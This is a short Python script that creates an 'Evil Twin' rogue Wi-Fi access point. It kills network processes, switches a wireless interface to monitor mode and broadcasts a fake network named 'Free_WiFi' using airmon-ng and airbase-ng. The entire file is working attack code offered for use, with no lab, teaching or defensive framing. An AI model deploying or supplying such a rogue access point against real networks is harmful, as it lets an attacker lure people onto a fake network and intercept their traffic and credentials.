import os
import subprocess
import time
import logging

# Configure logging
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def create_evil_twin_network(interface, fake_ssid):
    """Create a fake Wi-Fi network (Evil Twin)."""
    try:
        # Kill conflicting processes
        subprocess.call(['airmon-ng', 'check', 'kill'])

        # Disable the interface
        subprocess.call(['ifconfig', interface, 'down'])

        # Enable the interface in monitor mode
        subprocess.call(['airmon-ng', 'start', interface])

        # Start creating the fake network
        subprocess.call(['airbase-ng', '-e', fake_ssid, '-c', '6', interface])

        logging.info(f"Evil Twin network created: {fake_ssid}")
    except Exception as e:
        logging.error(f"Failed to create Evil Twin network: {e}")

# Example usage
if __name__ == '__main__':
    create_evil_twin_network('wlan0', 'Free_WiFi')
